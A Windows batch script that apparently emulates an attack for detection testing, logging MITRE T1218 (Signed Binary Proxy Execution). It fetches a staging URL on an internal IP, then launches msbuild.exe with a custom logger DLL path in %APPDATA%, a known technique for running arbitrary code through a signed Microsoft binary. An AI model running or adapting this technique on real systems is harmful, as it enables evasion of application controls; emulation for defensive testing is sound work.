@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET pjkcpgw=%APPDATA%\9693\c36247c8
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9693-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=firelox.txt
SET ewjmdkff=9693

SET vuwgqu=%APPDATA%\!pudaazx!\macula-simulations.log
SET xrblh=%APPDATA%\!pudaazx!
SET qykrr=1
SET yhvjs=

echo [%DATE% %TIME%][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_start=>> "!vuwgqu!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [%DATE% %TIME%][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_complete=>> "!vuwgqu!" 2>nul

SET ldybr=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe
echo [%DATE% %TIME%][DEBUG][!hlbnp!][!ewjmdkff!]: msbuild_start=>> "!vuwgqu!" 2>nul
!ldybr! /logger:LoggerEntry,!pjkcpgw!\\!syjfr!;MyParameters,Foo
IF ERRORLEVEL 1 (SET qykrr=0&SET yhvjs=msbuild_failed&echo [%DATE% %TIME%][DEBUG][!hlbnp!][!ewjmdkff!]: msbuild_failed=errorlevel_!errorlevel!>> "!vuwgqu!" 2>nul) ELSE (echo [%DATE% %TIME%][DEBUG][!hlbnp!][!ewjmdkff!]: msbuild_success=>> "!vuwgqu!" 2>nul)

SET uvczi=%date:~-4%-%date:~4,2%-%date:~7,2% %time:~0,2%:%time:~3,2%:%time:~6,2%.%time:~9,3%
echo [!uvczi!][TTP][!hlbnp!][!ewjmdkff!]: T1218|Signed Binary Proxy Execution=!qykrr!:!yhvjs!>> "!vuwgqu!" 2>nul

ENDLOCAL